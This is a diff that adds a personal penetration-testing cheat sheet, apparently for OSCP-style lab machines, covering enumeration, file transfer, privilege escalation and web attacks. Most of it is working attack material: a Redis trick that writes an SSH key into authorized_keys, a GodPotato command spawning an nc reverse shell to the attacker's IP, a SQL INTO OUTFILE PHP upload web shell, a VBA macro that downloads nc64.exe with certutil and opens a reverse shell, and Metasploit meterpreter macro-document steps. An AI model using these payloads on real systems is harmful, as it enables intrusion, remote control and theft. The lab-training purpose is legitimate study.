@@ -1,0 +1,302 @@
+# Troubleshooting : 
+
+MTU:
+if terminals get stuck : 
+try lowering the MTU to below 1250. We recommend decreasing it in increments of 50 until the connection becomes stable, but please do not set it below 700.
+```
+sudo ip link set dev tun0 mtu 1000
+```
+Also, ensure that you are using Google's DNS servers in your Kali by running these commands:  
+`sudo chattr -i /etc/resolv.conf` `sudo bash -c "" echo nameserver 8.8.8.8 > /etc/resolv.conf"" && sudo bash -c "" echo nameserver 8.8.4.4 >> /etc/resolv.conf""`
+# <span style="color:rgb(11, 142, 224)">Enumeration </span>
+
+not always will the machine allow ping 
+thats why add -Pn also in nmap
+because firewall block ping
+you can open the ip website in your browser and check 
+
+Nmap 
+```
+sudo nmap --min-rate 10000 -sCV -p- -Pn <IP>
+```
+
+When the TCP scan finishes, immediately run a UDP scan.
+```
+sudo nmap -Pn -n -sU --top-ports=100 --reason $IP
+```
+
+Gobuster
+smaller : 
+```
+sudo gobuster dir -w /usr/share/wordlists/dirb/common.txt -u <IP>
+```
+larger : 
+```
+sudo gobuster dir -w /usr/share/wordlists/dirb/big.txt -x html,txt,php -u <IP>
+```
+
+go to website 
+```
+/about.html
+```
+
+Wordpress enumeration 
+```
+wpscan --url http:<IP> -e ap,at,u
+```
+
+Redis 
+```
+redis-cli -h <IP> # to connect to the server
+
+after connecting : 
+info                            # to get information/details about the server
+SELECT <database_index>         # select databse
+keys *                          # to key all key names
+get <Key name>                  # to get value of the key 
+config get dir                  # to get config directory for redis
+config set dir /var/lib/redis/.ssh>  # to set a new directory
+
+ssh-keygen -t ed25519           # to make new kali pub ssh key (run as kali user)
+ls -la ~/.ssh/     # to see kali public ssh key 
+( echo -e "\n\n"; cat ~/.ssh/id_ed25519.pub; echo -e "\n\n") > id_rsa.pub   # to make it in format which redis accepts it 
+
+cat id_rsa.pub | redis-cli -h <redis ip> -x set <new key name> # make a new key
+
+config set dbfilename "authorized_keys"    # write our key to redis disk 
+save                                       # to save the file now
+
+ssh redis@<redis ip> -i ~/.ssh/<private key>  # ssh into redis from kali 
+```
+
+
+# <span style="color:rgb(11, 142, 224)">File Transfer </span>
+
+Start server on kali : 
+you won't be able to start on 80 on victim machine if it already has something running
+```
+python3 -m http.server 8000
+```
+
+Linux get file : 
+```
+wget http://KALI_VPN_IP:8000/filename -O filename
+curl http://<ip>/filename -o filename
+
+nc <victim ip> 4444 < filename     # sender 
+nc -lvnp 4444 > filename           # receiver
+```
+
+Windows get file : 
+if you want to switch from cmd to powershell:
+```
+powershell iwr http://KALI_IP:8000/filename -o filename
+```
+PowerShell:
+```
+iwr http://KALI_IP:8000/filename -outfile filename
+Invoke-WebRequest http://KALI_IP:8000/filename -outfile filename
+```
+CMD:
+```
+curl http://KALI_IP:8000/file -o file
+```
+
+SMB : 
+```
+on attacker machine : 
+impacket-smbserver -smb2support randomname . -username user -password password
+
+on victim machine : 
+net use z: \\192.168.45.206\test /u:test test
+dir z:
+```
+here , "randomname" is just a random name given , and can give any username and password 
+"." here is work in the current directory
+authentication required as some servers so not accept without auth
+
+# <span style="color:rgb(11, 142, 224)">Linux Privilege Escalation</span>
+
+```
+sudo -l
+```
+
+SUID : 
+command : 
+
+```
+
+```
+
+cron tabs 
+
+```
+ps aux
+```
+
+
+```
+pspy
+```
+
+how to use pspy ? 
+
+Find Flag 
+```
+find / -name "local.txt" 2>/dev/null
+find / -name "proof.txt" 2>/dev/null
+```
+
+# <span style="color:rgb(11, 142, 224)">Windows Privilege Escalation</span>
+
+
+like `tmp` folder in linux , windows has `tasks` folder , which is world writeable
+```
+PS C:\Windows> cd tasks
+```
+
+to check current user 
+```
+whoami
+```
+if it's "NT AUTHORITY\SYSTEM" you are administrator 
+otherwise no
+
+to check current priveleges
+```
+whoami /priv
+```
+
+Full powers : 
+for getting more privileges from normal user : 
+```
+https://github.com/itm4n/FullPowers
+```
+run : 
+```
+.\FullPowers.exe
+```
+
+well now use `SeImpersonatePrivilege` to gain administrator rights
+
+Order : 
+1. god potato 
+2. juicy potato 
+3. print spoofer (don't use now , it's outdated)
+
+GodPotato : 
+to gain privilege escalation from elevated privileges
+```
+https://github.com/BeichenDream/GodPotato
+```
+download the net4 version
+execute : 
+transfer `nc.exe` to windows first
+First locate a copy:
+```
+find /usr/share -iname "nc.exe" 2>/dev/null
+```
+then copy it to current folder where python server is running 
+```
+cp /usr/share/windows-resources/binaries/nc.exe .
+```
+cmd 
+```
+curl http://KALI_IP:8000/nc.exe -o nc.exe
+```
+start a listener on Kali:
+```
+nc -lvnp 4444
+```
+Then from the Windows LOCAL SERVICE shell:
+```
+.\GodPotato-NET4.exe -cmd "cmd /c nc.exe YOUR_KALI_VPN_IP 4444 -e cmd.exe"
+```
+Your Kali listener should then receive a **new shell**.
+
+Find Flag 
+do manually first 
+users > desktop/documents
+```
+where /r C:\ local.txt
+where /r C:\ proof.txt
+```
+
+
+# <span style="color:rgb(11, 142, 224)">Web Application </span>
+
+use default credentials 
+of username : password same you found , 
+admin:admin etc
+
+phpmyadmin : 
+username : root 
+password : leave empty (in some versions it's "password")
+
+
+Php get upload option to upload any file on website itself 
+```
+https://gist.github.com/BababaBlue
+```
+
+```
+SELECT 
+"<?php echo \'<form action=\"\" method=\"post\" enctype=\"multipart/form-data\" name=\"uploader\" id=\"uploader\">\';echo \'<input type=\"file\" name=\"file\" size=\"50\"><input name=\"_upl\" type=\"submit\" id=\"_upl\" value=\"Upload\"></form>\'; if( $_POST[\'_upl\'] == \"Upload\" ) { if(@copy($_FILES[\'file\'][\'tmp_name\'], $_FILES[\'file\'][\'name\'])) { echo \'<b>Upload Done.<b><br><br>\'; }else { echo \'<b>Upload Failed.</b><br><br>\'; }}?>"
+INTO OUTFILE 'C:/wamp/www/uploader.php';
+```
+after that , upload `PHP Ivan Sincek` revershell to the website
+
+
+Squid Proxy :
+configure FoxyProxy extension 
+with port number and ip address of victim machine 
+and then load the website 
+
+
+Macro :
+```vb
+Sub MyMacro
+	Dim str as String
+	str = "cmd.exe /c certutil -f -urlcache http://10.10.14.21/nc64.exe C:\Programdata\nc.exe && C:\Programdata\nc64.exe -e cmd.exe 10.10.14.21 4445"
+	Shell(str)
+End Sub
+```
+
+Alternative: Automating with Metasploit
+Metasploit has a module that auto-generates a malicious `.odt` with cross-platform VBA payloads (Windows, macOS, Linux).
+Generate the Payload : 
+```bash
+msfconsole
+use exploit/multi/fileformat/openoffice_document_macro
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.10.14.21
+set LPORT 4445
+run
+```
+This outputs a ready-to-upload `.odt` file.
+
+Catch the Shell :
+```bash
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.10.14.21
+set LPORT 4445
+run
+```
+Once the bot opens the document → Metasploit catches the staged connection → **Meterpreter session opened**.
+```
+sessions -i 1
+```
+
+Steps : 
+1. Identify Web Tech (language, framework, libs, cms, etc) - use wappalyzer
+2. Look for CVE if it uses public framework / libs / cms, if it doesnt work the first time then it doesnt work.
+3. Then Find likely vulnerable feature such as file upload, local file inclusion, sqli.
+4. try default credentials if you found login page.
+5. If it doesnt work then it's likely credentials hunting.
+6. Find for credentials in the landing page, and every shown pages and directory. look for names, username, password. If you see a string thats kinda weird thats could be a username or password.
+7. Can't find password ? try username as password. spray this credentials to other service.
+8. Can't find anything ? Fuzz the directory, look for differences on response type / length could be a clue. then fuzz the sub directory again (using seclist is enough).
+9. Still can't find anything ? then its a rabbit hole.
+
+
